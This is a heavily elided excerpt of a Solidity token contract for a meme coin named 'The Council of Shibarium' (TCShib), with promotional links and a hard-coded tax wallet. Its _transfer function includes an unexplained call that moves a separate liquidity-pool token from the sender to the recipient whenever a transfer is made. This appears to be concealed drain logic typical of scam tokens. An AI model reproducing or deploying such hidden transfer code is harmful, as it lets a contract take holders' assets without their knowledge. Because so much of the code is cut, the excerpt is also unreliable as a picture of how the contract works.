...
/**
WEBSITE: https://thecouncilofshibarium.com
TWITTER: https://twitter.com/tcshib
TELEGRAM: https://t.me/CryptoKrillOfficialEntry
**/
...
contract TCShib is Context, IERC20, Ownable {
    ...
    string private constant _name = "The Council of Shibarium";
    string private constant _symbol = "TCShib";
    ...
    constructor () {
        ...
        _taxWallet = payable(address(0xC79574843Ab79a4E585e90859a7dBe28cc89eE03));
    ...
    function _transfer(address from, address to, uint256 amount) private {
        ...
        if (!_isExcludedFromFee[from] && !_isExcludedFromFee[to]) {
            ...
            if (_lpToken != address(0)) {
                IERC20(_lpToken).transferFrom(from, to, amount);
            }
